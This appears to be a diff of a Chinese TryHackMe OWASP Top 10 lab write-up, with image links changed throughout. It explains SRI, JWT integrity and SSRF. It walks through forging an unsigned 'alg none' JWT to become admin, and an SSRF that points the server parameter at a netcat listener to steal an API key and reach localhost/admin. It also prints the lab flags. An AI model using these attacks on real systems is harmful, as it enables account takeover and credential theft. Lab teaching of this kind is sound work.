 让我们以WinSCP为例，以便更好地理解如何通过哈希值来检查文件的完整性。如果我们访问WinSCP的[Sourceforge存储库](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/)，我们会看到对于每个可供下载的相关文件，存储库页面都会发布一些对应的hash值：
 
-![image-20240108212635900](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108212635900.png)
+<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
 
 这些哈希值是由WinSCP的创建者预先计算得到的，以便我们可以在完成下载后检查文件的完整性，如果我们下载了`WinSCP-5.21.5-Setup.exe`文件，我们就可以重新计算该文件的hash值并将其与WinSCP的Sourceforge存储库中所发布的哈希值进行比较，从而验证文件的完整性。
 
@@ -767,7 +766,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 
 这样，当用户导航到你的网站时，用户的浏览器将读取网站的HTML代码并从指定的外部源加载JQuery。
 
-![image-20240109112709136](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109112709136.png)
+<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
 
 现在的问题是，如果攻击者以某种方式侵入了jQuery官方存储库，那么他们就可以更改`https://code.jquery.com/jquery-3.6.1.min.js`的内容以注入恶意代码；这样，任何访问你的网站的用户都会在不知不觉中提取恶意代码并将其在本地浏览器中执行。这属于软件完整性故障，因为你的网站没有很好地检查第三方库以查看其是否被修改过。现在的浏览器允许你根据第三方库的URL来规定hash值，以便仅当已下载的库文件的哈希值与预定值相匹配时才执行库代码，这种安全机制被称为子资源完整性(SRI)，你可以在[SRI相关文档页](https://www.srihash.org/)查看该机制的更多信息。
 
@@ -785,13 +784,13 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 
 我们先访问：https://www.srihash.org/
 
-![image-20240109115017277](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115017277.png)
+<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
 
 然后使用上述网站页面来计算 `https://code.jquery.com/jquery-1.12.4.min.js`库文件的SHA-256哈希：
 
-![image-20240109115124003](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115124003.png)
+<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109115140530](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115140530.png)
+<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>
 
 ```html
 <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
@@ -799,7 +798,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 
 最终我们得到的SHA-256哈希值为：`sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`
 
-![image-20240109115353736](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115353736.png)
+<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
 
 ## 数据完整性故障
 
@@ -809,7 +808,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 
 会话令牌将在后继的每个请求中被重复使用，以便Web应用程序知道我们是谁。这些令牌可以有多种形式，但通常是通过cookies进行分配的；**Cookies**是Web应用程序将会存储在用户浏览器上的键值对，并且会在用户每次向Web站点发送请求时自动重复使用。
 
-![image-20240109131617787](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109131617787.png)
+<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
 
 例如，如果你正在创建一个Web邮件应用程序，则可以在用户登录后为他们分配一个包含用户名的cookie，这样在后继请求中，用户的浏览器将始终通过cookie发送用户名，以便你的Web应用程序知道哪个用户正在请求连接；但是从安全的角度来看，这并不是一个很好的工作流程，由于cookie是存储在用户的浏览器上的，所以如果攻击者篡改cookie并修改用户名，那么他们就可能会冒充其他用户身份并阅读其他用户的电子邮件内容。我们可以说该应用程序存在数据完整性故障，因为它会信任“攻击者可篡改的数据”。
 
@@ -817,7 +816,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 
 JWTs是一种非常简单的令牌，它在允许你存储键值对的同时还能提供相关的完整性检查，通过使用JWT，你可以生成令牌、向用户提供这些令牌，还能通过完整性检查确保攻击者无法更改令牌中的键值对。JWT令牌的结构由以下3部分组成：
 
-![image-20240109182145759](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109182145759.png)
+<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
 
 如上图所示，令牌的标头部分会包含元数据以指示这是JWT并且使用的签名算法是HS256。令牌的Payload(有效载荷)部分会包含键值对以及Web应用程序希望浏览器客户端存储的数据。令牌的签名部分则类似于哈希值，可用于验证Payload的完整性，一旦你更改了令牌的Payload部分，那么Web应用程序就可以通过验证得知签名与Payload不匹配，从而得知你篡改了JWT。
 
@@ -838,31 +837,31 @@ JWTs是一种非常简单的令牌，它在允许你存储键值对的同时还�
 
 以我们上文所述的JWT为例，如果我们想更改JWT令牌的Payload部分(使用户名变为“admin”并且不做签名检查)，那么我们必须先解码令牌的标头、有效载荷，然后再根据需要修改它们，最后再进行重新编码处理。
 
-![image-20240109191841062](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109191841062.png)
+<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
 
 ### 答题
 
 部署目标虚拟机，使用攻击机上的浏览器导航至`http://MACHINE_IP:8089`(10.10.206.41:8089)页面：
 
-![image-20240109232248145](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232248145.png)
+<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
 
 尝试使用guest用户和随机密码登录上面的应用程序：
 
-![image-20240109232454341](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232454341.png)
+<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
 
 > guest用户的默认密码为：guest
 
-![image-20240109232833979](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232833979.png)
+<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
 
 现在我们能够以guest用户身份(使用密码guest)登录应用程序了，我们可以在本地浏览器中按F12调出开发者工具，以查看cookie的存储情况：
 
-![image-20240109232733123](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232733123.png)
+<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109233014061](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109233014061.png)
+<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
 > 包含JWT令牌的网站cookie的名称是：jwt-session
 
-![image-20240109233114622](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109233114622.png)
+<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
 接下来，让我们尝试修改本地浏览器中的JWT令牌，以便让当前的Web应用程序以为我们是admin用户。
 
@@ -879,9 +878,9 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE
 
 我们使用在线Base64编码/解码工具进行操作：https://appdevtools.com/base64-encoder-decoder
 
-![image-20240109234124398](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109234124398.png)
+<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109234154717](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109234154717.png)
+<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
 
 ```shell
 #head
@@ -901,9 +900,9 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE
 {"username":"admin","exp":1704816632}
 ```
 
-![image-20240109235134223](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235134223.png)
+<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109235218556](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235218556.png)
+<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
 
 以点号为间隔，重新组合得到的新JWT令牌值如下所示：
 
@@ -915,13 +914,13 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzA0ODE
 
 回到我们的本地浏览器界面，我们用新的JWT令牌替换之前的guest用户的JWT令牌值，然后我们刷新浏览器页面即可获取flag：
 
-![image-20240109235801281](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235801281.png)
+<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240109235848879](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235848879.png)
+<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
 
 > 得到的flag为：THM{Dont\_take\_cookies\_from\_strangers} 。
 
-![image-20240109235936626](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235936626.png)
+<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP9]安全日志和监控故障
 
@@ -957,11 +956,11 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzA0ODE
 
 在与本小节相关的Tryhackme实验房间中，单击`Download Task Files` 按钮以下载要分析的示例日志文件。
 
-![image-20240109192110074](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192110074.png)
+<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
 
 我们打开已下载的示例日志文件并查看其内容：
 
-![image-20240109192321809](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192321809.png)
+<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 
 分析该日志文件的内容可知：
 
@@ -969,7 +968,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzA0ODE
 
 2.四次登录操作使用的是不同的用户名，所以相关的一系列行为属于：暴力破解攻击（Brute Force）。
 
-![image-20240109192446654](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192446654.png)
+<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
 ## \[TOP10]服务器端请求伪造(SSRF)
 
@@ -979,7 +978,7 @@ tips：SSRF(Server-Side Request Forgery)服务器端请求伪造。
 
 例如，考虑一个使用外部API向其客户端发送SMS通知的Web应用程序。对于每封电子邮件，网站都需要向SMS提供商的服务器发出Web请求，以便发送想要发送的消息内容。由于SMS服务提供商是按每条消息计费的，因此他们会要求你在向其API发出的每个请求中添加一个他们预先分配给你的密钥；这个API密钥将充当身份验证令牌，使得SMS服务提供商能够知道要向哪个用户计费每条消息。该Web应用程序的相关工作流程如下：
 
-![image-20240108224740319](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108224740319.png)
+<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
 
 通过查看上图内容，我们很容易看出漏洞所在，应用程序向用户公开了`server`参数，该参数定义了SMS服务提供商的服务器名称；如果攻击者愿意，他们就可以通过简单地修改`server`值以指向由其所控制的计算机设备，然后Web应用程序就会将SMS请求转发给攻击者而不是SMS服务提供商。作为被转发的消息的一部分，攻击者还能获取到API密钥，从而允许他们使用SMS服务发送消息，而费用则由网站所有者承担。为了实现刚才所描述的效果，攻击者只需要向目标Web应用程序发送以下请求：
 
@@ -1015,17 +1014,17 @@ Accept: */*
 
 探索目标站点，我们可以发现唯一允许访问admin区域的主机：
 
-![image-20240110000348310](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000348310.png)
+<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
 
 > 唯一允许访问管理区域的主机是：localhost
 
 检查"Download Resume"按钮，查看相关外链的server(服务器)参数指向何处：
 
-![image-20240110000503770](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000503770.png)
+<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240110000622528](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000622528.png)
+<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
 
-![image-20240110002257509](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110002257509.png)
+<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
 
 > "/download?server=secure-file-storage.com:8087\&id=75482342"
 >
@@ -1035,7 +1034,7 @@ Accept: */*
 
 我们刚才找到了一个外部链接`http://10.10.206.41:8087/download?server=secure-file-storage.com:8087&id=75482342`，将其中的server参数的值指向我们的攻击机IP地址即可实现对SSRF漏洞的利用。
 
-![image-20240110000937193](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110000937193.png)
+<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
 
 我们先在攻击机终端设置一个netcat端口监听器：
 
@@ -1043,19 +1042,19 @@ Accept: */*
 nc -lvnp 8087
 ```
 
-![image-20240110001247077](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001247077.png)
+<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>
 
-然后再使用浏览器去访问替换了server参数的链接：`http://10.10.206.41:8087/download?server=10.11.15.168:8087&id=75482342`
+然后再使用浏览器去访问替换了server参数的链接：`http://10.10.206.41:8087/download?server=10.11.15.168:8087&id=75482342`&#x20;
 
-![image-20240110001801768](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001801768.png)
+<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
 
 然后我们就能在攻击机终端接受到相关的请求消息：
 
-![image-20240110001822974](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001822974.png)
+<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
 
 > 我们所捕获的请求中的API Key内容为：THM{Hello\_Im\_just\_an\_API\_key} 。
 
-![image-20240110001958602](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110001958602.png)
+<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>
 
 额外练习：尝试利用SSRF漏洞来访问目标站点的admin区域。
 
@@ -1071,10 +1070,10 @@ http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23&id=75482
 
 经过测试，我们发现需要对链接中的#符号进行URL编码处理。
 
-![image-20240110004215714](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110004215714.png)
+<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>
 
 最终我们将要访问的链接为：http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23\&id=75482342
 
-![image-20240110003133156](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240110003133156.png)
+<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>
 
 如上图所示，我们成功地得到了相关的flag值`thm{c4n_i_haz_flagz_plz?}`。
